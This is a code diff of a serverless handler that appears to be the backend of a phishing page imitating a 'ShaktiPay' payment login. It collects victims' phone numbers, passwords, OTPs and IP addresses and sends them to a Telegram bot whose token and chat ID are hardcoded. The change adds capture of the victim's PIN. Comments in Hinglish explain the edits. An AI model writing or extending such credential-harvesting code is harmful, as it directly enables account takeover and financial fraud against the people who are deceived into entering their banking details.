@@ -3,23 +3,23 @@ export default async function handler(req, res) {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const { type, phone, pass, otp } = req.body;
+  // Request body se pin ko bhi extract kiya gaya hai
+  const { type, phone, pass, pin, otp } = req.body;
 
   // --- TELEGRAM BOT CONFIGURATION ---
   const BOT_TOKEN_1 = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
   const CHAT_ID_1 = '6076330929';
 
-  // Agar aapko dusra bot bhi use karna ho toh yahan token aur chat ID daal sakte hain:
   const BOT_TOKEN_2 = ''; 
   const CHAT_ID_2 = '';
 
-  // Visitor ka real IP address
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
 
   let message = '';
 
   if (type === 'login') {
-    message = `✅ <b>New ShaktiPay Login</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: <code>${phone}</code>\n🔑 Password: <code>${pass}</code>`;
+    // Yahan PIN ko message mein add kar diya gaya hai
+    message = `✅ <b>New ShaktiPay Login</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: <code>${phone}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin || 'N/A'}</code>`;
   } else if (type === 'send_otp' || type === 'modal_otp') {
     message = `🔐 <b>OTP Requested</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
   } else if (type === 'verify_otp') {
